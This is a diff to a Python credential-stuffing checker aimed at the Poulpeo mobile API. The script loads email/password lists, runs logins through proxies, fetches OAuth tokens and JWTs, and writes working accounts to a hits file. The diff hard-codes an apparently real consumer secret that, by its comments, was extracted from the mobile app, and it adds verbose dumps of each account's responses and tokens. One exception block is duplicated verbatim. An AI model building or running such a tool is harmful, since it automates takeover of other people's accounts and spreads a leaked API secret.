@@ -7,6 +7,7 @@ import re
 import threading
 import time
 import uuid
+import traceback
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
 
@@ -19,10 +20,7 @@ from urllib.parse import parse_qs
 # =========================================================
 
 CONSUMER_KEY = "als57b6d9b235e084.77233595"
-# Même clé que Reqable pour requestToken + login + getToken.
-# CONSUMER_SECRET doit être celui associé à cette clé dans l’app mobile.
-# Ancienne clé possible (autre build) : als57b6d9bfbd8041.16892809
-CONSUMER_SECRET = "TON_CONSUMER_SECRET"
+CONSUMER_SECRET = "84dbb79eddc1effe14965db52caeae70636ac31b"
 
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
 
@@ -32,20 +30,50 @@ OPENDATA_CLIENT_ID = "als52f20495d05ac2.56394549"
 
 GET_TOKEN_URL = "https://mobile.poulpeo.com/api/2.2/user/getToken/"
 
-_GET_TOKEN_PRINT_LOCK = threading.Lock()
+_SCRIPT_PRINT_LOCK = threading.Lock()
+
+
+def _print_final_response(email, etape, url, response=None, corps=None, http_status=None):
+    with _SCRIPT_PRINT_LOCK:
+        builtins.print("\n")
+        builtins.print("#" * 76)
+        builtins.print("RÉPONSE FINALE (corps brut)")
+        builtins.print("#" * 76)
+        builtins.print(f"Étape     : {etape}")
+        builtins.print(f"Compte    : {email}")
+        builtins.print(f"URL       : {url}")
+        if response is not None:
+            builtins.print(f"HTTP      : {response.status_code}")
+            try:
+                fu = getattr(response, "url", "") or ""
+            except Exception:
+                fu = ""
+            if fu:
+                builtins.print(f"URL fin.  : {fu}")
+            corps = response.text if response.text is not None else ""
+        else:
+            builtins.print(f"HTTP      : {http_status}")
+        builtins.print("-" * 76)
+        builtins.print(corps if corps else "(corps vide)")
+        builtins.print("#" * 76)
+        builtins.print("", flush=True)
 
 
 def print_get_token_source(email, http_status, body):
     text = body if body else "(corps vide)"
-    with _GET_TOKEN_PRINT_LOCK:
-        builtins.print("\n" + "=" * 76)
-        builtins.print(
-            f"Réponse brute getToken (JWT) — compte: {email} — HTTP {http_status}"
-        )
-        builtins.print(f"URL: {GET_TOKEN_URL}")
+    with _SCRIPT_PRINT_LOCK:
+        builtins.print("\n")
+        builtins.print("=" * 76)
+        builtins.print("RÉPONSE FINALE — getToken (JWT)")
+        builtins.print("=" * 76)
+        builtins.print(f"Compte    : {email}")
+        builtins.print(f"HTTP      : {http_status}")
+        builtins.print(f"URL       : {GET_TOKEN_URL}")
         builtins.print("-" * 76)
         builtins.print(text)
-        builtins.print("=" * 76 + "\n", flush=True)
+        builtins.print("=" * 76)
+        builtins.print("", flush=True)
+
 
 # =========================================================
 # HITS FILE
@@ -382,7 +410,7 @@ def fetch_get_token_jwt(session, oauth_token, oauth_token_secret):
     return None, response.status_code, raw
 
 
-def fetch_request_token(session):
+def fetch_request_token(session, email):
     request_token_body = {
         "realm": REQUEST_TOKEN_URL
     }
@@ -405,6 +433,12 @@ def fetch_request_token(session):
     )
 
     if response.status_code != 200:
+        _print_final_response(
+            email,
+            "requestToken — échec (HTTP ≠ 200 ou erreur réseau)",
+            REQUEST_TOKEN_URL,
+            response=response,
+        )
         return None
 
     parsed = parse_qs(response.text)
@@ -412,6 +446,12 @@ def fetch_request_token(session):
         oauth_token = parsed["oauth_token"][0]
         oauth_token_secret = parsed["oauth_token_secret"][0]
     except (KeyError, IndexError):
+        _print_final_response(
+            email,
+            "requestToken — échec (corps sans oauth_token / oauth_token_secret)",
+            REQUEST_TOKEN_URL,
+            response=response,
+        )
         return None
 
     return oauth_token, oauth_token_secret
@@ -499,7 +539,7 @@ def load_accounts_from_file(path):
 def process_account(email, password, proxy_url, stats, hit_writer):
     session = new_session(proxy_url)
     try:
-        token_pair = fetch_request_token(session)
+        token_pair = fetch_request_token(session, email)
         if token_pair is None:
             stats.record("error")
             return
@@ -519,9 +559,40 @@ def process_account(email, password, proxy_url, stats, hit_writer):
             print_get_token_source(email, gt_status, gt_body)
             hit_writer.append_hit(email, password)
             stats.record("valid")
+        elif kind == "invalid":
+            _print_final_response(
+                email,
+                "login — identifiants refusés (invalid)",
+                LOGIN_URL,
+                response=response,
+            )
+            stats.record("invalid")
         else:
-            stats.record(kind)
-    except Exception:
+            _print_final_response(
+                email,
+                "login — erreur ou réponse inattendue (pas ok / pas invalid connu)",
+                LOGIN_URL,
+                response=response,
+            )
+            stats.record("error")
+    except Exception as e:
+        with _SCRIPT_PRINT_LOCK:
+            builtins.print("\n")
+            builtins.print("!" * 76)
+            builtins.print("EXCEPTION Python (compte: %s)" % email)
+            builtins.print("!" * 76)
+            builtins.print(repr(e))
+            traceback.print_exc()
+            builtins.print("!" * 76)
+            builtins.print("", flush=True)
+            builtins.print("\n")
+            builtins.print("!" * 76)
+            builtins.print("EXCEPTION Python (compte: %s)" % email)
+            builtins.print("!" * 76)
+            builtins.print(repr(e))
+            traceback.print_exc()
+            builtins.print("!" * 76)
+            builtins.print("", flush=True)
         stats.record("error")
 
 
